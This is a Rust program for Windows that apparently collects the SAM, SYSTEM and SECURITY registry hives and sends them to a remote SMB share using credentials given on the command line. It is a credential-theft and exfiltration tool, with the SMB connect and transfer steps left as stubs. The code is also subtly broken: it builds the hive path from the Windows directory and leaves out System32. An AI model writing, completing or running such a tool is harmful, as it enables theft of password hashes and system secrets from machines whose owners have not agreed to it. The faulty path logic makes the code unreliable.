use std::env;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;
use std::ptr::null;
use std::path::Path;
use windows_sys::Win32::Foundation::{GENERIC_READ, GetLastError};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, OPEN_EXISTING, FILE_SHARE_READ,
};
use windows_sys::Win32::System::SystemInformation::GetSystemWindowsDirectoryW;

fn main() {
    let args: Vec<String> = env::args().collect();

    // Expect: program_name smb_path username password
    if args.len() != 4 {
        std::process::exit(6); // Invalid arguments
    }

    let smb_path = &args[1];
    let username = &args[2];
    let password = &args[3];

    // Step 1: Locate hive files
    let hives = match locate_hives() {
        Ok(h) => h,
        Err(code) => std::process::exit(code),
    };

    // Step 2: Connect to SMB
    match connect_smb(smb_path, username, password) {
        Ok(_) => {},
        Err(code) => std::process::exit(code),
    }

    // Step 3: Transfer hives
    match transfer_hives(smb_path) {
        Ok(_) => {},
        Err(code) => std::process::exit(code),
    }

    // Success
    std::process::exit(0);
}

fn locate_hives() -> Result<[String; 3], i32> {
    // Get system directory
    let sys_dir = match get_system_directory() {
        Ok(dir) => dir,
        Err(code) => return Err(code),
    };

    let config_dir = format!("{}\\config", sys_dir);
    let hives = [
        format!("{}\\SAM", config_dir),
        format!("{}\\SYSTEM", config_dir),
        format!("{}\\SECURITY", config_dir),
    ];

    // Verify all three exist by attempting to open each
    for hive_path in &hives {
        if !Path::new(hive_path).exists() {
            return Err(1); // File not found
        }
    }

    Ok(hives)
}

fn get_system_directory() -> Result<String, i32> {
    let mut buffer = vec![0u16; 260];
    let len = unsafe {
        GetSystemWindowsDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32)
    };

    if len == 0 {
        return Err(6); // Unexpected error
    }

    buffer.truncate(len as usize);
    Ok(String::from_utf16_lossy(&buffer).to_string())
}

fn connect_smb(path: &str, user: &str, pass: &str) -> Result<(), i32> {
    Err(6) // Placeholder
}

fn transfer_hives(path: &str) -> Result<(), i32> {
    Err(6) // Placeholder
}
